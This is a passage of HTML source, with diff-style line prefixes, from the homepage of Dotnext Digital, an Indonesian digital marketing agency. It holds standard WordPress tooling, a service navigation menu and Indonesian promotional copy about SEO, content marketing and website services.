url('https:\/\/dotnextdigital.com\/wp-content\/uploads\/2020\/01\/pexels-photo-1128207.jpeg');}","hash":"dae2139d-5864-4c29-b712-442a6c9382e1","url":"https:\/\/dotnextdigital.com\/wp-content\/uploads\/2020\/01\/pexels-photo-1128207.jpeg"},{"selector":".et_pb_slider .et_pb_slide_0","style":".et_pb_slider .et_pb_slide_0{--wpr-bg-8103dc84-10e2-4ccd-b1e9-0f0e0fe46c05: url('https:\/\/dotnextdigital.com\/wp-content\/uploads\/2020\/01\/Digital-Marketing-Jakarta-1-scaled.jpg');}","hash":"8103dc84-10e2-4ccd-b1e9-0f0e0fe46c05","url":"https:\/\/dotnextdigital.com\/wp-content\/uploads\/2020\/01\/Digital-Marketing-Jakarta-1-scaled.jpg"},{"selector":".et_pb_slider .et_pb_slide_1","style":".et_pb_slider .et_pb_slide_1{--wpr-bg-30925ae7-5236-4957-b41f-1d422f281270: url('https:\/\/dotnextdigital.com\/wp-content\/uploads\/2020\/01\/Branding-produk-scaled.jpg');}","hash":"30925ae7-5236-4957-b41f-1d422f281270","url":"https:\/\/dotnextdigital.com\/wp-content\/uploads\/2020\/01\/Branding-produk-scaled.jpg"}]; const rocket_excluded_pairs = [];</script></head>
+<body data-rsssl=1 class="home page-template-default page page-id-12 mega-menu-primary-menu et_pb_button_helper_class et_fixed_nav et_show_nav et_primary_nav_dropdown_animation_fade et_secondary_nav_dropdown_animation_fade et_header_style_left et_pb_footer_columns4 et_cover_background et_pb_gutter windows et_pb_gutters3 et_pb_pagebuilder_layout et_no_sidebar et_divi_theme et-db">
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PRH6X7P"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->	<div id="page-container">
+
+	
+	
+			<header id="main-header" data-height-onload="50">
+			<div class="container clearfix et_menu_container">
+							<div class="logo_container">
+					<span class="logo_helper"></span>
+					<a href="https://dotnextdigital.com/">
+						<img src="https://dotnextdigital.com/wp-content/uploads/2019/08/Dotnext-logo.jpg" width="93" height="43" alt="DOTNEXT DIGITAL" id="logo" data-height-percentage="51" />
+					</a>
+				</div>
+							<div id="et-top-navigation" data-height="50" data-fixed-height="45">
+											<nav id="top-menu-nav">
+						<div id="mega-menu-wrap-primary-menu" class="mega-menu-wrap"><div class="mega-menu-toggle"><div class="mega-toggle-blocks-left"></div><div class="mega-toggle-blocks-center"></div><div class="mega-toggle-blocks-right"><div class='mega-toggle-block mega-menu-toggle-animated-block mega-toggle-block-0' id='mega-toggle-block-0'><button aria-label="Toggle Menu" class="mega-toggle-animated mega-toggle-animated-slider" type="button" aria-expanded="false">
+                  <span class="mega-toggle-animated-box">
+                    <span class="mega-toggle-animated-inner"></span>
+                  </span>
+                </button></div></div></div><ul id="mega-menu-primary-menu" class="mega-menu max-mega-menu mega-menu-horizontal mega-no-js" data-event="hover_intent" data-effect="fade" data-effect-speed="200" data-effect-mobile="slide_left" data-effect-speed-mobile="200" data-panel-width="body" data-panel-inner-width="#et_pb_slider_container_inner" data-mobile-force-width="body" data-second-click="go" data-document-click="collapse" data-vertical-behaviour="standard" data-breakpoint="768" data-unbind="true" data-mobile-state="collapse_all" data-mobile-direction="vertical" data-hover-intent-timeout="300" data-hover-intent-interval="100"><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-menu-item-home mega-current-menu-item mega-page_item mega-page-item-12 mega-current_page_item mega-align-bottom-left mega-menu-flyout mega-menu-item-175' id='mega-menu-item-175'><a class="mega-menu-link" href="https://dotnextdigital.com/" aria-current="page" tabindex="0">Beranda</a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-255' id='mega-menu-item-255'><a class="mega-menu-link" href="https://dotnextdigital.com/tentang/" tabindex="0">Tentang</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-has-children mega-menu-megamenu mega-align-bottom-left mega-menu-grid mega-has-icon mega-icon-left mega-menu-item-12972' id='mega-menu-item-12972'><a class="dashicons-cover-image mega-menu-link" href="https://dotnextdigital.com/?page_id=12968&#038;preview=true" aria-expanded="false" tabindex="0">Services<span class="mega-indicator"></span></a>
+<ul class="mega-sub-menu">
+<li class='mega-menu-row' id='mega-menu-12972-0'>
+	<ul class="mega-sub-menu">
+<li class='mega-menu-column mega-menu-columns-3-of-12' id='mega-menu-12972-0-0'>
+		<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-widget widget_media_image mega-menu-item-media_image-4' id='mega-menu-item-media_image-4'><h4 class="mega-block-title">DOTNEXT DIGITAL AGENCY</h4><a href="https://dotnextdigital.com/"><img width="278" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20278%20300'%3E%3C/svg%3E" class="image wp-image-12982  attachment-medium size-medium" alt="Digital Marketing Agency" style="max-width: 100%; height: auto;" decoding="async" fetchpriority="high" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2024/09/Image-Header-Menu-1-278x300.webp" /><noscript><img width="278" height="300" src="https://dotnextdigital.com/wp-content/uploads/2024/09/Image-Header-Menu-1-278x300.webp" class="image wp-image-12982  attachment-medium size-medium" alt="Digital Marketing Agency" style="max-width: 100%; height: auto;" decoding="async" fetchpriority="high" /></noscript></a></li>		</ul>
+</li><li class='mega-menu-column mega-menu-columns-3-of-12' id='mega-menu-12972-0-1'>
+		<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-has-children mega-hide-sub-menu-on-mobile mega-menu-item-11986' id='mega-menu-item-11986'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/konten-marketing/">Konten Marketing<span class="mega-indicator"></span></a>
+			<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-4027' id='mega-menu-item-4027'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/konten-marketing/jasa-konten-instagram/">Jasa Konten Instagram</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-15514' id='mega-menu-item-15514'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/konten-marketing/jasa-tiktok-management/">Jasa Konten Tiktok</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-5890' id='mega-menu-item-5890'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/konten-marketing/jasa-linkedin-indonesia/">Jasa Konten Linkedin</a></li>			</ul>
+</li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-has-children mega-menu-item-11846' id='mega-menu-item-11846'><a class="mega-menu-link" href="https://dotnextdigital.com/sosial-media-marketing/">Sosial Media Marketing<span class="mega-indicator"></span></a>
+			<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-11847' id='mega-menu-item-11847'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/sosial-media-marketing/jasa-sosial-Media-Marketing/">Jasa Sosial Media Marketing</a></li>			</ul>
+</li>		</ul>
+</li><li class='mega-menu-column mega-menu-columns-3-of-12' id='mega-menu-12972-0-2'>
+		<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-has-children mega-menu-item-1251' id='mega-menu-item-1251'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/website/">Website<span class="mega-indicator"></span></a>
+			<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-12403' id='mega-menu-item-12403'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/website/jasa-pembuatan-website/">Jasa Pembuatan Website</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-15537' id='mega-menu-item-15537'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/website/jasa-pembuatan-website-bisnis/">Jasa Pembuatan Website Bisnis</a></li>			</ul>
+</li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-has-children mega-menu-item-13315' id='mega-menu-item-13315'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/">Jasa Digital Marketing<span class="mega-indicator"></span></a>
+			<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-13314' id='mega-menu-item-13314'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/jasa-branding-bisnis-online/">Jasa Branding Bisnis Online</a></li>			</ul>
+</li>		</ul>
+</li><li class='mega-menu-column mega-menu-columns-3-of-12' id='mega-menu-12972-0-3'>
+		<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-has-children mega-menu-item-12404' id='mega-menu-item-12404'><a class="mega-menu-link" href="https://dotnextdigital.com/search-engine-optimization/">Search Engine Optimization<span class="mega-indicator"></span></a>
+			<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-11662' id='mega-menu-item-11662'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/search-engine-optimization/jasa-seo/">Jasa SEO</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-12595' id='mega-menu-item-12595'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/search-engine-optimization/jasa-SEO/jasa-seo-profesional/">Jasa SEO Profesional</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-11684' id='mega-menu-item-11684'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/search-engine-optimization/jasa-SEO/pakar-seo-indonesia/">Pakar SEO Indonesia</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-11663' id='mega-menu-item-11663'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/search-engine-optimization/jasa-SEO/jasa-audit-seo/">Jasa Audit SEO</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-14031' id='mega-menu-item-14031'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/search-engine-optimization/jasa-seo/jasa-seo-wordpress/">Jasa SEO Wordpress</a></li>			</ul>
+</li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-has-children mega-menu-item-11664' id='mega-menu-item-11664'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/search-engine-optimization/jasa-seo/jasa-seo-lokal/">SEO Lokal<span class="mega-indicator"></span></a>
+			<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-11665' id='mega-menu-item-11665'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/search-engine-optimization/jasa-seo/jasa-seo-jakarta/">Jasa SEO Jakarta</a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-11708' id='mega-menu-item-11708'><a class="mega-menu-link" href="https://dotnextdigital.com/jasa-digital-marketing/search-engine-optimization/jasa-seo/jasa-seo-bali/">Jasa SEO Bali</a></li>			</ul>
+</li>		</ul>
+</li>	</ul>
+</li></ul>
+</li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-970' id='mega-menu-item-970'><a class="mega-menu-link" href="https://dotnextdigital.com/blog/" aria-expanded="false" tabindex="0">Blog<span class="mega-indicator"></span></a>
+<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-taxonomy mega-menu-item-object-category mega-menu-item-1023' id='mega-menu-item-1023'><a class="mega-menu-link" href="https://dotnextdigital.com/category/digital-marketing/">Digital Marketing Tips</a></li><li class='mega-menu-item mega-menu-item-type-taxonomy mega-menu-item-object-category mega-menu-item-1830' id='mega-menu-item-1830'><a class="mega-menu-link" href="https://dotnextdigital.com/category/instagram-bisnis/">Instagram Bisnis</a></li><li class='mega-menu-item mega-menu-item-type-taxonomy mega-menu-item-object-category mega-menu-item-1831' id='mega-menu-item-1831'><a class="mega-menu-link" href="https://dotnextdigital.com/category/facebook-bisnis/">Facebook Bisnis</a></li><li class='mega-menu-item mega-menu-item-type-taxonomy mega-menu-item-object-category mega-menu-item-1090' id='mega-menu-item-1090'><a class="mega-menu-link" href="https://dotnextdigital.com/category/website-development/">Website Tips</a></li><li class='mega-menu-item mega-menu-item-type-taxonomy mega-menu-item-object-category mega-menu-item-1361' id='mega-menu-item-1361'><a class="mega-menu-link" href="https://dotnextdigital.com/category/wordpress/">Wordpress Tips</a></li></ul>
+</li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-3463' id='mega-menu-item-3463'><a class="mega-menu-link" href="https://dotnextdigital.com/portofolio-dotnext-digital/" tabindex="0">Portofolio</a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-367' id='mega-menu-item-367'><a class="mega-menu-link" href="https://dotnextdigital.com/kontak/" tabindex="0">Kontak</a></li></ul></div>						</nav>
+					
+					
+					
+					
+					<div id="et_mobile_nav_menu">
+				<div class="mobile_nav closed">
+					<span class="select_page">Pilih Laman</span>
+					<span class="mobile_menu_bar mobile_menu_bar_toggle"></span>
+				</div>
+			</div>				</div> <!-- #et-top-navigation -->
+			</div> <!-- .container -->
+					</header> <!-- #main-header -->
+			<div id="et-main-area">
+	
+<div id="main-content">
+
+
+			
+				<article id="post-12" class="post-12 page type-page status-publish has-post-thumbnail hentry">
+
+				
+					<div class="entry-content">
+					<div class="et-l et-l--post">
+			<div class="et_builder_inner_content et_pb_gutters3">
+		<div class="et_pb_section et_pb_section_0 et_pb_fullwidth_section et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_fullwidth_slider_0 et_pb_slider et_slider_auto et_slider_speed_7000 et_slider_auto_ignore_hover">
+				<div class="et_pb_slides">
+					<div class="et_pb_slide et_pb_slide_0 et_pb_bg_layout_dark et_pb_media_alignment_center et-pb-active-slide" data-slide-id="et_pb_slide_0">
+				
+				
+				<div class="et_pb_container clearfix">
+					<div class="et_pb_slider_container_inner">
+						
+						<div class="et_pb_slide_description">
+							<h2 class="et_pb_slide_title"><a href="https://dotnextdigital.com/layanan-digital-agency-indonesia/">Digital Marketing Agency Jakarta</a></h2><div class="et_pb_slide_content"><p>Digital marketing adalah suatu bentuk pemasaran yang menggunakan media digital, seperti internet, untuk menyampaikan pesan promosi kepada target audiens. Ini melibatkan penggunaan berbagai kanal online seperti situs web, media sosial, email, dan mesin pencari untuk membangun kesadaran merek, meningkatkan penjualan, dan berinteraksi dengan pelanggan. Berbeda dari marketing offline yang membutuhkan pendekatan yang berbeda.</p></div>
+							<div class="et_pb_button_wrapper"><a class="et_pb_button et_pb_more_button" href="https://dotnextdigital.com/layanan-digital-agency-indonesia/">LAYANAN KAMI</a></div>
+						</div>
+					</div>
+				</div>
+				
+				
+				
+			</div>
+			<div class="et_pb_slide et_pb_slide_1 et_pb_bg_layout_dark et_pb_media_alignment_center" data-slide-id="et_pb_slide_1">
+				
+				
+				<div class="et_pb_container clearfix">
+					<div class="et_pb_slider_container_inner">
+						
+						<div class="et_pb_slide_description">
+							<h2 class="et_pb_slide_title">Branding & Tentukan Pasar yang Potensial </h2><div class="et_pb_slide_content"><p>Bentuk Citra dan Image dari Brand Anda, Menambah Value Produk.</p></div>
+							
+						</div>
+					</div>
+				</div>
+				
+				
+				
+			</div>
+			
+				</div>
+				
+			</div>
+			
+				
+				
+			</div><div class="et_pb_section et_pb_section_1 et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_0">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_0  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_0  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><h1 style="text-align: center;">Digital Marketing Agency Indonesia</h1></div>
+			</div><div class="et_pb_module et_pb_text et_pb_text_1  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p style="text-align: center;">Semua yang dibutuhkan untuk perkembangan bisnis Anda ada pada jasa digital marketing kami. Karenaya, pastikan strategi pemasaran digital Anda bersama kami. Kami adalah digital marketing agency Jakarta yang sudah berpengalaman.</p>
+<p style="text-align: center;">Kami siap membantu bisnis Anda untuk GO DIGITAL dengan jasa kami. Berikut Beberapa Layanan Kami.</p></div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div><div class="et_pb_row et_pb_row_1 et_animated et_pb_gutters2">
+				<div class="et_pb_column et_pb_column_1_4 et_pb_column_1  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_0  et_pb_text_align_center  et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					<div class="et_pb_main_blurb_image"><a href="https://dotnextdigital.com/jasa-digital-marketing/website/jasa-pembuatan-website/-jakarta/"><span class="et_pb_image_wrap et_pb_only_image_mode_wrap"><img decoding="async" width="942" height="484" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20942%20484'%3E%3C/svg%3E" alt="Digital Marketing" data-lazy-srcset="https://dotnextdigital.com/wp-content/uploads/2023/07/Web-D-01-new.jpg 942w, https://dotnextdigital.com/wp-content/uploads/2023/07/Web-D-01-new-480x247.jpg 480w" data-lazy-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 942px, 100vw" class="et-waypoint et_pb_animation_top et_pb_animation_top_tablet et_pb_animation_top_phone wp-image-6030" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2023/07/Web-D-01-new.jpg" /><noscript><img decoding="async" width="942" height="484" src="https://dotnextdigital.com/wp-content/uploads/2023/07/Web-D-01-new.jpg" alt="Digital Marketing" srcset="https://dotnextdigital.com/wp-content/uploads/2023/07/Web-D-01-new.jpg 942w, https://dotnextdigital.com/wp-content/uploads/2023/07/Web-D-01-new-480x247.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 942px, 100vw" class="et-waypoint et_pb_animation_top et_pb_animation_top_tablet et_pb_animation_top_phone wp-image-6030" /></noscript></span></a></div>
+					<div class="et_pb_blurb_container">
+						<h1 class="et_pb_module_header"><a href="https://dotnextdigital.com/jasa-digital-marketing/website/jasa-pembuatan-website/-jakarta/">Digital Marketing Website</a></h1>
+						<div class="et_pb_blurb_description"><p style="text-align: justify;">Dalam upaya meningkatkan kepercayaan calon pelanggan, penting untuk menyediakan informasi yang cepat, menarik, dan terpercaya melalui website Anda. Layanan website kami dirancang untuk berbagai jenis bisnis, menawarkan desain template yang dapat dipilih atau disesuaikan sesuai kebutuhan Anda. Terutamnya dengan fokus pada digital marketing, website Anda tidak hanya dapat diakses melalui berbagai perangkat mobile, tetapi juga menjadi alat efektif dalam memperluas jangkauan dan mempromosikan bisnis Anda secara online.</p></div>
+					</div>
+				</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_2  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_1  et_pb_text_align_left  et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					<div class="et_pb_main_blurb_image"><a href="https://dotnextdigital.com/jasa-konten-marketing/"><span class="et_pb_image_wrap et_pb_only_image_mode_wrap"><img decoding="async" width="942" height="484" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20942%20484'%3E%3C/svg%3E" alt="Digital Marketing" data-lazy-srcset="https://dotnextdigital.com/wp-content/uploads/2023/07/SMM-01.jpg 942w, https://dotnextdigital.com/wp-content/uploads/2023/07/SMM-01-480x247.jpg 480w" data-lazy-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 942px, 100vw" class="et-waypoint et_pb_animation_top et_pb_animation_top_tablet et_pb_animation_top_phone wp-image-6031" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2023/07/SMM-01.jpg" /><noscript><img decoding="async" width="942" height="484" src="https://dotnextdigital.com/wp-content/uploads/2023/07/SMM-01.jpg" alt="Digital Marketing" srcset="https://dotnextdigital.com/wp-content/uploads/2023/07/SMM-01.jpg 942w, https://dotnextdigital.com/wp-content/uploads/2023/07/SMM-01-480x247.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 942px, 100vw" class="et-waypoint et_pb_animation_top et_pb_animation_top_tablet et_pb_animation_top_phone wp-image-6031" /></noscript></span></a></div>
+					<div class="et_pb_blurb_container">
+						<h1 class="et_pb_module_header"><a href="https://dotnextdigital.com/jasa-konten-marketing/">Jasa Konten Digital Marketing</a></h1>
+						<div class="et_pb_blurb_description"><p>Dengan jasa konten marketing, Anda dapat meningkatkan daya tarik, keterlibatan, dan daya tarik profil bisnis Anda bagi konsumen. Secara profesional mengelola akun bisnis sosial media, layanan social media marketing kami melibatkan penyusunan strategi, pembuatan konten, serta copywriting Dengan Jasa Konten. Terutamanya dalam era digital marketing, langkah-langkah ini menjadi kunci untuk mendapatkan perhatian yang lebih luas dan meningkatkan daya saing bisnis Anda secara online.</p></div>
+					</div>
+				</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_3  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_2  et_pb_text_align_left  et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					<div class="et_pb_main_blurb_image"><a href="https://dotnextdigital.com/jasa-digital-marketing/search-engine-optimization/jasa-seo/"><span class="et_pb_image_wrap et_pb_only_image_mode_wrap"><img decoding="async" width="942" height="484" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20942%20484'%3E%3C/svg%3E" alt="Digital Marketing" data-lazy-srcset="https://dotnextdigital.com/wp-content/uploads/2023/07/SEO-01.jpg 942w, https://dotnextdigital.com/wp-content/uploads/2023/07/SEO-01-480x247.jpg 480w" data-lazy-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 942px, 100vw" class="et-waypoint et_pb_animation_top et_pb_animation_top_tablet et_pb_animation_top_phone wp-image-6033" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2023/07/SEO-01.jpg" /><noscript><img decoding="async" width="942" height="484" src="https://dotnextdigital.com/wp-content/uploads/2023/07/SEO-01.jpg" alt="Digital Marketing" srcset="https://dotnextdigital.com/wp-content/uploads/2023/07/SEO-01.jpg 942w, https://dotnextdigital.com/wp-content/uploads/2023/07/SEO-01-480x247.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 942px, 100vw" class="et-waypoint et_pb_animation_top et_pb_animation_top_tablet et_pb_animation_top_phone wp-image-6033" /></noscript></span></a></div>
+					<div class="et_pb_blurb_container">
+						<h1 class="et_pb_module_header"><a href="https://dotnextdigital.com/jasa-digital-marketing/search-engine-optimization/jasa-seo/">Jasa SEO Digital Marketing</a></h1>
+						<div class="et_pb_blurb_description"><p style="text-align: justify;">Dalam ranah digital marketing, penting untuk mengoptimalkan setiap halaman website Anda dengan menerapkan strategi Search Engine Optimization (SEO). Jasa SEO dapat membantu meningkatkan kualitas website Anda, Terutamanya untuk memastikan mudah ditemukan oleh calon pelanggan, dan mencapai peringkat teratas di halaman 1 Google. Dengan pendekatan ini, bisnis Anda dapat memaksimalkan visibilitas online dan meningkatkan daya saing di dunia digital.</p></div>
+					</div>
+				</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_4  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_3  et_pb_text_align_left  et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					<div class="et_pb_main_blurb_image"><a href="https://dotnextdigital.com/digital-marketing-jakarta/"><span class="et_pb_image_wrap et_pb_only_image_mode_wrap"><img decoding="async" width="942" height="484" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20942%20484'%3E%3C/svg%3E" alt="Digital Marketing" data-lazy-srcset="https://dotnextdigital.com/wp-content/uploads/2023/07/Digital-M-01.jpg 942w, https://dotnextdigital.com/wp-content/uploads/2023/07/Digital-M-01-480x247.jpg 480w" data-lazy-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 942px, 100vw" class="et-waypoint et_pb_animation_top et_pb_animation_top_tablet et_pb_animation_top_phone wp-image-6035" data-lazy-src="https://dotnextdigital.com/wp-content/uploads/2023/07/Digital-M-01.jpg" /><noscript><img decoding="async" width="942" height="484" src="https://dotnextdigital.com/wp-content/uploads/2023/07/Digital-M-01.jpg" alt="Digital Marketing" srcset="https://dotnextdigital.com/wp-content/uploads/2023/07/Digital-M-01.jpg 942w, https://dotnextdigital.com/wp-content/uploads/2023/07/Digital-M-01-480x247.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 942px, 100vw" class="et-waypoint et_pb_animation_top et_pb_animation_top_tablet et_pb_animation_top_phone wp-image-6035" /></noscript></span></a></div>
+					<div class="et_pb_blurb_container">
+						<h1 class="et_pb_module_header"><a href="https://dotnextdigital.com/digital-marketing-jakarta/">Jasa Iklan Digital Marketing</a></h1>
+						<div class="et_pb_blurb_description"><p style="text-align: justify;">Dalam era digital marketing, penting untuk menghubungkan bisnis atau produk Anda melalui miliaran saluran pemasaran internet yang efektif. Tujuannya adalah untuk menjangkau pasar yang lebih luas di dunia digital. Dengan memanfaatkan jasa iklan digital, seperti iklan sosial media, Google Ads, dan Youtube Ads, Anda dapat memperluas jangkauan bisnis Anda secara signifikan. Strategi ini tidak hanya meningkatkan visibilitas, tetapi juga membantu membangun kehadiran online yang kuat untuk mendukung pertumbuhan bisnis Anda.</p></div>
+					</div>
+				</div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div><div class="et_pb_section et_pb_section_2 et_section_regular section_has_divider et_pb_bottom_divider" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_2">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_5  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_2  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><h1 style="text-align: center;">Mengapa Harus Digital Marketing?</h1></div>
+			</div><div class="et_pb_module et_pb_text et_pb_text_3  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p>Dalam era Revolusi Industri 4.0, strategi pemasaran digital semakin menjadi pilihan utama bagi berbagai perusahaan. Terutamanya, digital marketing memberikan keunggulan signifikan berbeda dari metode pemasaran konvensional. Dengan pemikiran ini, perusahaan dapat mengoptimalkan efektivitas kampanye mereka, mengakomodasi perkembangan teknologi dan preferensi konsumen.</p>
+<p>Pentingnya pemasaran digital terdahulu telah terbukti pada waktu terkini. Contohnya, melalui social media marketing, perusahaan dapat berinteraksi secara langsung dengan audiens mereka. Seperti yang sudah dijelaskan sebelumnya, jasa digital marketing melibatkan berbagai aspek, termasuk SEO, pembuatan website, digital ads, dan layanan lainnya. Kendatipun begitu, perlu pemahaman yang mendalam untuk merancang strategi yang sesuai.</p>
+<p>Dengan menggunakan jasa digital marketing, bisnis dapat menjangkau pasar yang lebih luas dan massive. Contohnya, Google Ads dan Youtube Ads dapat meningkatkan visibilitas perusahaan. Seperti yang sudah dijelaskan sebelumnya, keberadaan pemasaran digital membawa kelebihan signifikan. Pada waktu bersamaan, munculnya pembeli yang terinformasi dapat diatasi dengan pembuatan konten yang berkualitas. Berikut beberapa contoh keunggulan kami.</p></div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div><div class="et_pb_row et_pb_row_3 et_animated et_pb_equal_columns et_pb_gutters2">
+				<div class="et_pb_column et_pb_column_1_4 et_pb_column_6  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_accordion et_pb_accordion_0">
+				
+				
+				
+				
+				<div class="et_pb_toggle et_pb_module et_pb_accordion_item et_pb_accordion_item_0 et_pb_section_video_on_hover  et_pb_toggle_open">
+				
+				
+				
+				
+				<h2 class="et_pb_toggle_title"></h2>
+				<div class="et_pb_toggle_content clearfix"><p style="text-align: center;">Biaya Lebih Efektif dan Efisien</p>
